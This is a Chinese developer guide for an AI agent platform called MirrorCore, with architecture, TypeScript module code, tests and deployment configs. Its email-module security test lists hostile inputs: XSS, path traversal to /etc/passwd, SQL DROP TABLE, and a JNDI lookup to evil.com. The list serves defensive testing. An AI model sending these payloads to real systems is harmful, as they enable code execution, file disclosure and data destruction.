# MirrorCore 智能模块化AI代理系统 - 开发指南 🛠️

本文档为MirrorCore智能模块化AI代理系统的开发者提供详细的架构设计说明、模块开发规范和扩展商店生态建设指南。

## 📋 目录

- [系统架构概览](#-系统架构概览)
- [智能模块加载机制](#-智能模块加载机制)
- [扩展商店架构](#-扩展商店架构)
- [模块开发指南](#-模块开发指南)
- [AI意图识别系统](#-ai意图识别系统)
- [开发环境配置](#-开发环境配置)
- [测试与部署](#-测试与部署)
- [贡献指南](#-贡献指南)

---

## 🏗️ 系统架构概览

### 智能模块化架构

MirrorCore采用革命性的智能模块加载架构，AI根据用户对话内容自动判断并加载所需功能模块：

```
┌─────────────────────────────────────────────────────────────┐
│                    用户交互层                                 │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐        │
│  │  桌面应用   │  │   Web界面   │  │  移动端APP  │        │
│  │ (Electron)  │  │  (React)    │  │ (React Native)│      │
│  └─────────────┘  └─────────────┘  └─────────────┘        │
├─────────────────────────────────────────────────────────────┤
│                  AI智能判断引擎                               │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │           意图识别与模块推荐系统                         │ │
│  │  • 自然语言理解  • 意图分类  • 模块匹配  • 智能推荐    │ │
│  └─────────────────────────────────────────────────────────┘ │
├─────────────────────────────────────────────────────────────┤
│                  扩展商店管理层                               │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │                  模块商店引擎                            │ │
│  │  • 模块发现  • 自动下载  • 版本管理  • 依赖解析        │ │
│  │  • 安全检查  • 性能监控  • 用户评价  • 智能推荐        │ │
│  └─────────────────────────────────────────────────────────┘ │
├─────────────────────────────────────────────────────────────┤
│                  动态模块加载层                               │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐      │
│  │📧 邮件   │ │📅 日程   │ │🏃‍♂️ 健康  │ │🎮 娱乐   │      │
│  │  助手    │ │  管理    │ │  管理    │ │  内容    │      │
│  └──────────┘ └──────────┘ └──────────┘ └──────────┘      │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐      │
│  │🔧 开发   │ │💼 办公   │ │🏠 智能   │ │📱 生活   │      │
│  │  助手    │ │  效率    │ │  家居    │ │  助手    │      │
│  └──────────┘ └──────────┘ └──────────┘ └──────────┘      │
├─────────────────────────────────────────────────────────────┤
│                  核心服务层                                   │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐      │
│  │ API网关  │ │ 消息队列 │ │ 数据存储 │ │ 安全认证 │      │
│  │  服务    │ │  服务    │ │  服务    │ │  服务    │      │
│  └──────────┘ └──────────┘ └──────────┘ └──────────┘      │
├─────────────────────────────────────────────────────────────┤
│                  AI推理与学习层                               │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐      │
│  │ GPT-4    │ │ Claude   │ │ Gemini   │ │ 本地模型 │      │
│  │  集成    │ │  集成    │ │  集成    │ │  支持    │      │
│  └──────────┘ └──────────┘ └──────────┘ └──────────┘      │
└─────────────────────────────────────────────────────────────┘
```

### 核心设计理念

1. **智能感知**：AI自动理解用户需求，无需手动选择功能
2. **按需加载**：只加载当前任务所需的模块，节省资源
3. **无缝集成**：模块加载过程对用户透明，提供流畅体验
4. **生态开放**：支持第三方开发者贡献模块，构建丰富生态

### 技术栈

#### 核心技术栈
- **运行时**: Node.js 18+ / TypeScript 5+
- **AI推理**: OpenAI GPT-4, Anthropic Claude, Google Gemini
- **模块系统**: 动态ES模块加载, WebAssembly支持
- **消息队列**: RabbitMQ, Apache Kafka (分布式)
- **数据存储**: MongoDB (文档), Redis (缓存), Vector DB (向量搜索)
- **容器化**: Docker, Kubernetes (生产环境)

#### 智能模块技术栈
- **意图识别**: 自然语言处理, 机器学习分类器
- **模块发现**: 语义搜索, 协同过滤推荐
- **安全沙箱**: V8 Isolates, WebAssembly沙箱
- **性能监控**: 实时性能指标, 资源使用追踪
- **版本管理**: 语义化版本控制, 依赖解析算法

#### 扩展商店技术栈
- **内容分发**: CDN全球加速, 增量更新
- **安全扫描**: 静态代码分析, 恶意代码检测
- **质量评估**: 自动化测试, 代码质量指标
- **用户分析**: 行为追踪, 个性化推荐
- **支付系统**: 多种支付方式, 订阅管理

#### 前端技术栈
- **桌面应用**: Electron + React + TypeScript
- **Web应用**: React 18+ + TypeScript + Vite
- **移动应用**: React Native + TypeScript
- **状态管理**: Zustand / Redux Toolkit
- **UI组件**: Ant Design / Material-UI
- **样式方案**: Tailwind CSS / Styled-components
- **构建工具**: Vite / Webpack 5

#### DevOps技术栈
- **容器化**: Docker + Docker Compose
- **编排**: Kubernetes (生产环境)
- **CI/CD**: GitHub Actions / GitLab CI
- **监控**: Prometheus + Grafana
- **日志**: ELK Stack (Elasticsearch + Logstash + Kibana)
- **部署**: AWS / Azure / 阿里云

---

## 🤖 AI意图识别系统

### 意图分类架构

```typescript
// 意图分类器接口
interface IntentClassifier {
  classify(input: string, context: ConversationContext): Promise<ClassificationResult>;
  train(dataset: TrainingDataset): Promise<void>;
  evaluate(testSet: TestDataset): Promise<EvaluationMetrics>;
}

// 分类结果
interface ClassificationResult {
  intent: IntentCategory;
  confidence: number;
  entities: ExtractedEntity[];
  moduleRecommendations: ModuleRecommendation[];
}

// 意图类别
enum IntentCategory {
  EMAIL_MANAGEMENT = 'email_management',
  CONTENT_DISCOVERY = 'content_discovery', 
  HEALTH_TRACKING = 'health_tracking',
  SCHEDULE_MANAGEMENT = 'schedule_management',
  DEVELOPMENT_ASSISTANCE = 'development_assistance',
  SMART_HOME = 'smart_home',
  ENTERTAINMENT = 'entertainment',
  PRODUCTIVITY = 'productivity'
}
```

### 多层意图识别

```typescript
class HierarchicalIntentClassifier implements IntentClassifier {
  private primaryClassifier: PrimaryIntentClassifier;
  private secondaryClassifiers: Map<IntentCategory, SecondaryIntentClassifier>;
  private entityExtractor: EntityExtractor;
  
  async classify(input: string, context: ConversationContext): Promise<ClassificationResult> {
    // 第一层：主要意图分类
    const primaryResult = await this.primaryClassifier.classify(input, context);
    
    // 第二层：细分意图分类
    const secondaryClassifier = this.secondaryClassifiers.get(primaryResult.intent);
    const secondaryResult = secondaryClassifier 
      ? await secondaryClassifier.classify(input, context)
      : null;
    
    // 实体提取
    const entities = await this.entityExtractor.extract(input, primaryResult.intent);
    
    // 模块推荐
    const moduleRecommendations = await this.recommendModules(
      primaryResult, 
      secondaryResult, 
      entities, 
      context
    );
    
    return {
      intent: secondaryResult?.intent || primaryResult.intent,
      confidence: this.calculateCombinedConfidence(primaryResult, secondaryResult),
      entities,
      moduleRecommendations
    };
  }
  
  private async recommendModules(
    primary: ClassificationResult,
    secondary: ClassificationResult | null,
    entities: ExtractedEntity[],
    context: ConversationContext
  ): Promise<ModuleRecommendation[]> {
    const recommender = new ModuleRecommender();
    
    return await recommender.recommend({
      primaryIntent: primary.intent,
      secondaryIntent: secondary?.intent,
      entities,
      userHistory: context.userHistory,
      currentContext: context.currentContext
    });
  }
}
```

### 实体提取系统

```typescript
class EntityExtractor {
  private namedEntityRecognizer: NamedEntityRecognizer;
  private customEntityExtractors: Map<string, CustomEntityExtractor>;
  
  async extract(text: string, intent: IntentCategory): Promise<ExtractedEntity[]> {
    const entities: ExtractedEntity[] = [];
    
    // 通用实体识别
    const namedEntities = await this.namedEntityRecognizer.recognize(text);
    entities.push(...namedEntities);
    
    // 意图特定实体提取
    const customExtractor = this.customEntityExtractors.get(intent);
    if (customExtractor) {
      const customEntities = await customExtractor.extract(text);
      entities.push(...customEntities);
    }
    
    // 实体关系分析
    const relationships = await this.analyzeEntityRelationships(entities);
    
    return this.enrichEntitiesWithRelationships(entities, relationships);
  }
  
  private async analyzeEntityRelationships(entities: ExtractedEntity[]): Promise<EntityRelationship[]> {
    // 使用图神经网络分析实体间关系
    const relationshipAnalyzer = new EntityRelationshipAnalyzer();
    return await relationshipAnalyzer.analyze(entities);
  }
}
```

### 上下文感知推理

```typescript
class ContextAwareReasoner {
  private conversationMemory: ConversationMemory;
  private userProfiler: UserProfiler;
  private situationalAnalyzer: SituationalAnalyzer;
  
  async enhanceClassification(
    baseResult: ClassificationResult,
    context: ConversationContext
  ): Promise<EnhancedClassificationResult> {
    // 对话历史分析
    const conversationInsights = await this.conversationMemory.analyze(context.history);
    
    // 用户画像分析
    const userProfile = await this.userProfiler.getProfile(context.userId);
    
    // 情境分析
    const situationalContext = await this.situationalAnalyzer.analyze({
      timeOfDay: new Date().getHours(),
      dayOfWeek: new Date().getDay(),
      userLocation: context.location,
      deviceType: context.deviceType
    });
    
    // 综合推理
    const enhancedResult = await this.performContextualReasoning({
      baseResult,
      conversationInsights,
      userProfile,
      situationalContext
    });
    
    return enhancedResult;
  }
  
  private async performContextualReasoning(input: ReasoningInput): Promise<EnhancedClassificationResult> {
    // 使用大语言模型进行上下文推理
    const reasoningPrompt = this.buildReasoningPrompt(input);
    const reasoningResult = await this.llmService.reason(reasoningPrompt);
    
    return this.parseReasoningResult(reasoningResult, input.baseResult);
  }
}
```

---

## 🧪 测试与部署

### 测试策略

#### 1. 模块测试框架

```typescript
// 模块测试基类
abstract class ModuleTestSuite {
  protected module: Module;
  protected testEnvironment: TestEnvironment;
  
  async setup(): Promise<void> {
    this.testEnvironment = await this.createTestEnvironment();
    this.module = await this.loadModule();
    await this.module.initialize(this.getTestConfig());
  }
  
  async teardown(): Promise<void> {
    await this.module.cleanup();
    await this.testEnvironment.cleanup();
  }
  
  // 功能测试
  abstract testCapabilities(): Promise<void>;
  
  // 性能测试
  abstract testPerformance(): Promise<void>;
  
  // 安全测试
  abstract testSecurity(): Promise<void>;
  
  // 兼容性测试
  abstract testCompatibility(): Promise<void>;
}

// 邮件模块测试示例
class EmailModuleTestSuite extends ModuleTestSuite {
  async testCapabilities(): Promise<void> {
    // 测试邮件发送功能
    const result = await this.module.execute({
      capability: 'compose-email',
      parameters: {
        recipient: 'test@example.com',
        subject: 'Test Email',
        content: 'This is a test email'
      },
      context: this.createTestContext()
    });
    
    expect(result.success).toBe(true);
    expect(result.messageId).toBeDefined();
  }
  
  async testPerformance(): Promise<void> {
    const startTime = Date.now();
    
    // 批量发送测试
    const promises = Array.from({ length: 100 }, (_, i) => 
      this.module.execute({
        capability: 'compose-email',
        parameters: {
          recipient: `test${i}@example.com`,
          subject: `Test Email ${i}`,
          content: `This is test email number ${i}`
        },
        context: this.createTestContext()
      })
    );
    
    await Promise.all(promises);
    
    const duration = Date.now() - startTime;
    expect(duration).toBeLessThan(30000); // 30秒内完成
  }
  
  async testSecurity(): Promise<void> {
    // 测试恶意输入处理
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      '../../etc/passwd',
      'DROP TABLE users;',
      '${jndi:ldap://evil.com/a}'
    ];
    
    for (const input of maliciousInputs) {
      const result = await this.module.execute({
        capability: 'compose-email',
        parameters: {
          recipient: input,
          subject: input,
          content: input
        },
        context: this.createTestContext()
      });
      
      // 应该安全地处理恶意输入
      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid input');
    }
  }
}
```

#### 2. 集成测试

```typescript
class IntegrationTestSuite {
  private testSystem: TestSystem;
  
  async testModuleInteraction(): Promise<void> {
    // 测试模块间协作
    const emailModule = await this.testSystem.loadModule('email-assistant');
    const scheduleModule = await this.testSystem.loadModule('schedule-management');
    
    // 创建带提醒的邮件任务
    const scheduleResult = await scheduleModule.execute({
      capability: 'create-reminder',
      parameters: {
        title: 'Send weekly report',
        time: '2024-01-15T09:00:00Z',
        action: {
          type: 'email',
          parameters: {
            recipient: 'boss@company.com',
            subject: 'Weekly Report',
            template: 'weekly-report'
          }
        }
      },
      context: this.createTestContext()
    });
    
    expect(scheduleResult.success).toBe(true);
    
    // 模拟时间到达，检查邮件是否发送
    await this.testSystem.advanceTime('2024-01-15T09:00:00Z');
    
    const emailLogs = await this.testSystem.getModuleLogs('email-assistant');
    expect(emailLogs).toContainEqual(
      expect.objectContaining({
        action: 'email-sent',
        recipient: 'boss@company.com'
      })
    );
  }
  
  async testAIIntentRecognition(): Promise<void> {
    const testCases = [
      {
        input: '给张三发邮件说明天开会',
        expectedIntent: 'email_management',
        expectedModules: ['email-assistant'],
        expectedEntities: [
          { type: 'person', value: '张三' },
          { type: 'action', value: '发邮件' },
          { type: 'time', value: '明天' },
          { type: 'event', value: '开会' }
        ]
      },
      {
        input: '搜索明日方舟新活动攻略',
        expectedIntent: 'content_discovery',
        expectedModules: ['content-discovery'],
        expectedEntities: [
          { type: 'game', value: '明日方舟' },
          { type: 'content_type', value: '攻略' },
          { type: 'time', value: '新活动' }
        ]
      }
    ];
    
    for (const testCase of testCases) {
      const result = await this.testSystem.processUserInput(testCase.input);
      
      expect(result.intent).toBe(testCase.expectedIntent);
      expect(result.recommendedModules).toEqual(
        expect.arrayContaining(testCase.expectedModules)
      );
      expect(result.entities).toEqual(
        expect.arrayContaining(testCase.expectedEntities)
      );
    }
  }
}
```

#### 3. 性能测试

```typescript
class PerformanceTestSuite {
  async testModuleLoadingPerformance(): Promise<void> {
    const loadingTimes: number[] = [];
    
    // 测试模块加载时间
    for (let i = 0; i < 50; i++) {
      const startTime = performance.now();
      
      const module = await this.testSystem.loadModule('email-assistant');
      await module.initialize(this.getTestConfig());
      
      const endTime = performance.now();
      loadingTimes.push(endTime - startTime);
      
      await module.cleanup();
    }
    
    const averageLoadTime = loadingTimes.reduce((a, b) => a + b) / loadingTimes.length;
    const maxLoadTime = Math.max(...loadingTimes);
    
    expect(averageLoadTime).toBeLessThan(1000); // 平均1秒内
    expect(maxLoadTime).toBeLessThan(3000); // 最大3秒内
  }
  
  async testConcurrentModuleExecution(): Promise<void> {
    const concurrentTasks = 100;
    const startTime = performance.now();
    
    const promises = Array.from({ length: concurrentTasks }, async (_, i) => {
      const module = await this.testSystem.loadModule('email-assistant');
      return await module.execute({
        capability: 'compose-email',
        parameters: {
          recipient: `test${i}@example.com`,
          subject: `Concurrent Test ${i}`,
          content: `This is concurrent test number ${i}`
        },
        context: this.createTestContext()
      });
    });
    
    const results = await Promise.all(promises);
    const endTime = performance.now();
    
    const successCount = results.filter(r => r.success).length;
    const totalTime = endTime - startTime;
    
    expect(successCount).toBe(concurrentTasks);
    expect(totalTime).toBeLessThan(10000); // 10秒内完成
  }
}
```

### 部署流程

#### 1. 容器化部署

```dockerfile
# Dockerfile
FROM node:18-alpine AS builder

WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

COPY . .
RUN npm run build

FROM node:18-alpine AS runtime

# 安全配置
RUN addgroup -g 1001 -S nodejs
RUN adduser -S mirrorcore -u 1001

WORKDIR /app

# 复制构建产物
COPY --from=builder --chown=mirrorcore:nodejs /app/dist ./dist
COPY --from=builder --chown=mirrorcore:nodejs /app/node_modules ./node_modules
COPY --from=builder --chown=mirrorcore:nodejs /app/package.json ./package.json

# 创建数据目录
RUN mkdir -p /app/data && chown mirrorcore:nodejs /app/data

USER mirrorcore

EXPOSE 3000

HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD node dist/healthcheck.js

CMD ["node", "dist/server.js"]
```

```yaml
# docker-compose.yml
version: '3.8'

services:
  mirrorcore-api:
    build: .
    ports:
      - "3000:3000"
    environment:
      - NODE_ENV=production
      - REDIS_URL=redis://redis:6379
      - MONGODB_URL=mongodb://mongodb:27017/mirrorcore
    depends_on:
      - redis
      - mongodb
    volumes:
      - ./data:/app/data
    restart: unless-stopped
    
  redis:
    image: redis:7-alpine
    volumes:
      - redis_data:/data
    restart: unless-stopped
    
  mongodb:
    image: mongo:6
    volumes:
      - mongodb_data:/data/db
    environment:
      - MONGO_INITDB_ROOT_USERNAME=admin
      - MONGO_INITDB_ROOT_PASSWORD=password
    restart: unless-stopped
    
  nginx:
    image: nginx:alpine
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf
      - ./ssl:/etc/nginx/ssl
    depends_on:
      - mirrorcore-api
    restart: unless-stopped

volumes:
  redis_data:
  mongodb_data:
```

#### 2. Kubernetes部署

```yaml
# k8s/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: mirrorcore-api
  labels:
    app: mirrorcore-api
spec:
  replicas: 3
  selector:
    matchLabels:
      app: mirrorcore-api
  template:
    metadata:
      labels:
        app: mirrorcore-api
    spec:
      containers:
      - name: mirrorcore-api
        image: mirrorcore/api:latest
        ports:
        - containerPort: 3000
        env:
        - name: NODE_ENV
          value: "production"
        - name: REDIS_URL
          valueFrom:
            secretKeyRef:
              name: mirrorcore-secrets
              key: redis-url
        - name: MONGODB_URL
          valueFrom:
            secretKeyRef:
              name: mirrorcore-secrets
              key: mongodb-url
        resources:
          requests:
            memory: "512Mi"
            cpu: "250m"
          limits:
            memory: "1Gi"
            cpu: "500m"
        livenessProbe:
          httpGet:
            path: /health
            port: 3000
          initialDelaySeconds: 30
          periodSeconds: 10
        readinessProbe:
          httpGet:
            path: /ready
            port: 3000
          initialDelaySeconds: 5
          periodSeconds: 5

---
apiVersion: v1
kind: Service
metadata:
  name: mirrorcore-api-service
spec:
  selector:
    app: mirrorcore-api
  ports:
  - protocol: TCP
    port: 80
    targetPort: 3000
  type: LoadBalancer
```

#### 3. CI/CD流水线

```yaml
# .github/workflows/deploy.yml
name: Deploy MirrorCore

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    
    - name: Setup Node.js
      uses: actions/setup-node@v3
      with:
        node-version: '18'
        cache: 'npm'
    
    - name: Install dependencies
      run: npm ci
    
    - name: Run tests
      run: npm run test:ci
    
    - name: Run integration tests
      run: npm run test:integration
    
    - name: Run security scan
      run: npm audit --audit-level high

  build:
    needs: test
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Build Docker image
      run: |
        docker build -t mirrorcore/api:${{ github.sha }} .
        docker tag mirrorcore/api:${{ github.sha }} mirrorcore/api:latest
    
    - name: Push to registry
      run: |
        echo ${{ secrets.DOCKER_PASSWORD }} | docker login -u ${{ secrets.DOCKER_USERNAME }} --password-stdin
        docker push mirrorcore/api:${{ github.sha }}
        docker push mirrorcore/api:latest

  deploy:
    needs: build
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    
    steps:
    - name: Deploy to Kubernetes
      run: |
        kubectl set image deployment/mirrorcore-api mirrorcore-api=mirrorcore/api:${{ github.sha }}
        kubectl rollout status deployment/mirrorcore-api
```

---

## 🤝 贡献指南

### 模块开发贡献

#### 1. 开发环境准备

```bash
# 克隆项目
git clone https://github.com/your-org/mirrorcore.git
cd mirrorcore

# 安装依赖
npm install

# 创建模块开发分支
git checkout -b feature/new-module-name

# 启动开发环境
npm run dev:module-development
```

#### 2. 模块开发规范

```typescript
// 模块开发模板
import { BaseModule, ModuleConfig, ModuleAction, ModuleResult } from '@mirrorcore/module-sdk';

export class YourModule extends BaseModule {
  // 模块基本信息
  id = 'your-module-id';
  name = 'Your Module Name';
  version = '1.0.0';
  description = 'Description of what your module does';
  
  // 模块能力定义
  capabilities = [
    {
      id: 'your-capability',
      name: 'Your Capability Name',
      description: 'What this capability does',
      intentPatterns: [
        'pattern1',
        'pattern2'
      ],
      inputSchema: {
        type: 'object',
        properties: {
          // 定义输入参数
        },
        required: ['requiredParam']
      },
      outputSchema: {
        type: 'object',
        properties: {
          // 定义输出格式
        }
      }
    }
  ];
  
  // 初始化方法
  protected async onInitialize(): Promise<void> {
    // 模块初始化逻辑
  }
  
  // 执行方法
  protected async onExecute(action: ModuleAction): Promise<ModuleResult> {
    switch (action.capability) {
      case 'your-capability':
        return await this.handleYourCapability(action.parameters);
      default:
        throw new Error(`Unknown capability: ${action.capability}`);
    }
  }
  
  private async handleYourCapability(params: any): Promise<ModuleResult> {
    // 实现具体功能
    return {
      success: true,
      data: {
        // 返回结果
      }
    };
  }
}
```

#### 3. 代码质量要求

```typescript
// 代码规范检查配置
// .eslintrc.js
module.exports = {
  extends: ['@mirrorcore/eslint-config'],
  rules: {
    // 模块特定规则
    'no-console': 'error',
    'prefer-const': 'error',
    '@typescript-eslint/no-unused-vars': 'error',
    '@typescript-eslint/explicit-function-return-type': 'warn'
  }
};

// 测试覆盖率要求
// jest.config.js
module.exports = {
  coverageThreshold: {
    global: {
      branches: 80,
      functions: 80,
      lines: 80,
      statements: 80
    }
  }
};
```

#### 4. 提交流程

```bash
# 1. 运行测试
npm run test
npm run test:integration
npm run test:security

# 2. 代码质量检查
npm run lint
npm run type-check
npm run security-scan

# 3. 构建检查
npm run build

# 4. 提交代码
git add .
git commit -m "feat: add new module for [功能描述]"

# 5. 推送并创建PR
git push origin feature/new-module-name
# 在GitHub上创建Pull Request
```

### 扩展商店贡献

#### 1. 模块发布流程

```bash
# 1. 准备模块包
npm run package:module

# 2. 模块验证
npm run validate:module

# 3. 安全扫描
npm run security:scan

# 4. 发布到商店
npm run publish:store
```

#### 2. 模块质量标准

- **功能完整性**: 所有声明的能力都必须正确实现
- **错误处理**: 优雅处理所有可能的错误情况
- **性能要求**: 响应时间 < 5秒，内存使用 < 100MB
- **安全标准**: 通过所有安全扫描，无已知漏洞
- **文档完整**: 包含完整的API文档和使用示例
- **测试覆盖**: 代码覆盖率 > 80%

#### 3. 社区参与

- **问题反馈**: 通过GitHub Issues报告问题
- **功能建议**: 通过Discussions提出新功能建议
- **代码贡献**: 通过Pull Request贡献代码
- **文档改进**: 帮助改进项目文档
- **社区支持**: 在社区论坛帮助其他开发者

通过以上开发指南，开发者可以深入理解MirrorCore的智能模块化架构，并参与到这个革命性的AI代理系统的建设中来。

### 1. AI智能体引擎 (Agent Engine)

#### 架构设计

```typescript
// 智能体核心接口
interface AIAgent {
  // 自然语言理解
  understand(input: string, context: AgentContext): Promise<Intent>;
  
  // 任务规划
  plan(intent: Intent, capabilities: Capability[]): Promise<TaskPlan>;
  
  // 任务执行
  execute(plan: TaskPlan): Promise<ExecutionResult>;
  
  // 学习优化
  learn(feedback: Feedback): Promise<void>;
}

// 智能体上下文
interface AgentContext {
  userId: string;
  sessionId: string;
  projectPath?: string;
  currentFile?: string;
  history: Message[];
  preferences: UserPreferences;
}

// 意图识别结果
interface Intent {
  type: IntentType;
  confidence: number;
  parameters: Record<string, any>;
  requiredCapabilities: string[];
}

// 任务计划
interface TaskPlan {
  id: string;
  steps: TaskStep[];
  estimatedDuration: number;
  dependencies: string[];
  rollbackPlan?: TaskStep[];
}
```

#### 核心组件

1. **自然语言处理器 (NLP Processor)**
   ```typescript
   class NLPProcessor {
     async parseIntent(text: string): Promise<Intent> {
       // 使用AI模型解析用户意图
       const response = await this.aiService.complete({
         messages: [
           { role: 'system', content: INTENT_CLASSIFICATION_PROMPT },
           { role: 'user', content: text }
         ]
       });
       
       return this.parseIntentFromResponse(response);
     }
   }
   ```

2. **任务规划器 (Task Planner)**
   ```typescript
   class TaskPlanner {
     async createPlan(intent: Intent, context: AgentContext): Promise<TaskPlan> {
       const availableModules = await this.moduleRegistry.getAvailableModules();
       const plan = await this.generateExecutionPlan(intent, availableModules, context);
       
       return this.optimizePlan(plan);
     }
   }
   ```

3. **执行引擎 (Execution Engine)**
   ```typescript
   class ExecutionEngine {
     async executePlan(plan: TaskPlan): Promise<ExecutionResult> {
       const results: StepResult[] = [];
       
       for (const step of plan.steps) {
         try {
           const result = await this.executeStep(step);
           results.push(result);
           
           if (!result.success && step.critical) {
             await this.rollback(results);
             throw new ExecutionError(`Critical step failed: ${step.id}`);
           }
         } catch (error) {
           await this.handleStepError(step, error);
         }
       }
       
       return { success: true, results };
     }
   }
   ```

### 2. 模块注册系统 (Module Registry)

#### 模块接口定义

```typescript
// 基础模块接口
interface Module {
  id: string;
  name: string;
  version: string;
  description: string;
  capabilities: Capability[];
  dependencies: string[];
  
  // 生命周期方法
  initialize(config: ModuleConfig): Promise<void>;
  execute(action: ModuleAction): Promise<ModuleResult>;
  cleanup(): Promise<void>;
  
  // 健康检查
  healthCheck(): Promise<HealthStatus>;
}

// 模块能力定义
interface Capability {
  id: string;
  name: string;
  description: string;
  inputSchema: JSONSchema;
  outputSchema: JSONSchema;
  examples: CapabilityExample[];
}

// 模块动作
interface ModuleAction {
  capability: string;
  parameters: Record<string, any>;
  context: ExecutionContext;
}
```

#### 模块注册器

```typescript
class ModuleRegistry {
  private modules = new Map<string, Module>();
  private capabilities = new Map<string, Capability>();
  
  async registerModule(module: Module): Promise<void> {
    // 验证模块
    await this.validateModule(module);
    
    // 检查依赖
    await this.checkDependencies(module.dependencies);
    
    // 初始化模块
    await module.initialize(this.getModuleConfig(module.id));
    
    // 注册模块和能力
    this.modules.set(module.id, module);
    module.capabilities.forEach(cap => {
      this.capabilities.set(cap.id, cap);
    });
    
    this.logger.info(`Module registered: ${module.id}@${module.version}`);
  }
  
  async executeCapability(capabilityId: string, parameters: any): Promise<any> {
    const capability = this.capabilities.get(capabilityId);
    if (!capability) {
      throw new Error(`Capability not found: ${capabilityId}`);
    }
    
    const module = this.findModuleByCapability(capabilityId);
    return await module.execute({
      capability: capabilityId,
      parameters,
      context: this.createExecutionContext()
    });
  }
}
```

### 3. 代码分析模块 (Code Analysis Module)

#### 核心功能

```typescript
class CodeAnalysisModule implements Module {
  id = 'code-analysis';
  name = 'Code Analysis Module';
  
  async analyzeProject(projectPath: string, options: AnalysisOptions): Promise<ProjectAnalysis> {
    const analyzer = new ProjectAnalyzer();
    
    // 扫描项目结构
    const structure = await analyzer.scanStructure(projectPath);
    
    // 分析代码质量
    const quality = await analyzer.analyzeQuality(structure, options);
    
    // 检测安全问题
    const security = await analyzer.analyzeSecurity(structure);
    
    // 性能分析
    const performance = await analyzer.analyzePerformance(structure);
    
    // 依赖分析
    const dependencies = await analyzer.analyzeDependencies(structure);
    
    return {
      structure,
      quality,
      security,
      performance,
      dependencies,
      recommendations: await this.generateRecommendations({
        quality, security, performance, dependencies
      })
    };
  }
  
  async generateCode(request: CodeGenerationRequest): Promise<GeneratedCode> {
    const generator = new CodeGenerator();
    
    // 分析需求
    const requirements = await generator.analyzeRequirements(request);
    
    // 生成代码
    const code = await generator.generateCode(requirements);
    
    // 代码优化
    const optimizedCode = await generator.optimizeCode(code);
    
    // 生成测试
    const tests = await generator.generateTests(optimizedCode);
    
    return {
      code: optimizedCode,
      tests,
      documentation: await generator.generateDocumentation(optimizedCode),
      usage: await generator.generateUsageExamples(optimizedCode)
    };
  }
}
```

### 4. 项目管理模块 (Project Management Module)

#### 任务管理系统

```typescript
class ProjectManagementModule implements Module {
  id = 'project-management';
  name = 'Project Management Module';
  
  async createTask(taskData: CreateTaskRequest): Promise<Task> {
    // 任务分析和分解
    const analyzer = new TaskAnalyzer();
    const analysis = await analyzer.analyzeTask(taskData);
    
    // 创建任务
    const task = await this.taskRepository.create({
      ...taskData,
      estimatedHours: analysis.estimatedHours,
      complexity: analysis.complexity,
      subtasks: analysis.subtasks,
      dependencies: analysis.dependencies
    });
    
    // 生成项目文件
    if (taskData.generateFiles) {
      await this.generateTaskFiles(task);
    }
    
    // 发送通知
    await this.notificationService.notifyTaskCreated(task);
    
    return task;
  }
  
  async trackProgress(taskId: string): Promise<TaskProgress> {
    const task = await this.taskRepository.findById(taskId);
    const progress = await this.progressTracker.calculateProgress(task);
    
    // 更新进度
    await this.taskRepository.updateProgress(taskId, progress);
    
    // 检查里程碑
    await this.checkMilestones(task, progress);
    
    return progress;
  }
}
```

### 5. 文件操作模块 (File Operations Module)

#### 安全文件操作

```typescript
class FileOperationsModule implements Module {
  id = 'file-operations';
  name = 'File Operations Module';
  
  private securityManager = new FileSecurityManager();
  
  async createFile(path: string, content: string, options: CreateFileOptions): Promise<FileResult> {
    // 安全检查
    await this.securityManager.validatePath(path);
    await this.securityManager.checkPermissions(path, 'write');
    
    // 备份现有文件
    if (options.backup && await this.exists(path)) {
      await this.createBackup(path);
    }
    
    // 创建目录
    if (options.createDirectories) {
      await this.ensureDirectories(dirname(path));
    }
    
    // 写入文件
    await fs.writeFile(path, content, { encoding: options.encoding || 'utf8' });
    
    // 记录操作日志
    await this.auditLogger.logFileOperation('create', path, {
      size: content.length,
      encoding: options.encoding
    });
    
    return { success: true, path, size: content.length };
  }
  
  async searchFiles(query: SearchQuery): Promise<SearchResult[]> {
    const searcher = new FileSearcher();
    
    // 构建搜索索引
    const index = await searcher.buildIndex(query.path, {
      fileTypes: query.fileTypes,
      excludePatterns: query.excludePatterns
    });
    
    // 执行搜索
    const results = await searcher.search(index, query.pattern, {
      caseSensitive: query.caseSensitive,
      regex: query.regex,
      maxResults: query.maxResults
    });
    
    return results;
  }
}
```

### 6. 命令执行模块 (Command Execution Module)

#### 安全命令执行

```typescript
class CommandExecutionModule implements Module {
  id = 'command-execution';
  name = 'Command Execution Module';
  
  private commandValidator = new CommandValidator();
  private processManager = new ProcessManager();
  
  async executeCommand(command: string, options: ExecutionOptions): Promise<ExecutionResult> {
    // 命令安全验证
    await this.commandValidator.validate(command);
    
    // 创建执行环境
    const environment = await this.createSecureEnvironment(options);
    
    // 执行命令
    const process = await this.processManager.spawn(command, {
      cwd: options.workingDirectory,
      env: environment,
      timeout: options.timeout || 30000,
      shell: options.shell
    });
    
    // 监控执行
    const monitor = new ExecutionMonitor(process);
    monitor.on('output', (data) => this.handleOutput(data));
    monitor.on('error', (error) => this.handleError(error));
    
    // 等待完成
    const result = await process.wait();
    
    // 记录执行日志
    await this.auditLogger.logCommandExecution(command, result);
    
    return result;
  }
  
  async createScript(scriptData: CreateScriptRequest): Promise<Script> {
    const script = await this.scriptRepository.create({
      ...scriptData,
      hash: await this.calculateScriptHash(scriptData.commands),
      createdAt: new Date()
    });
    
    // 验证脚本安全性
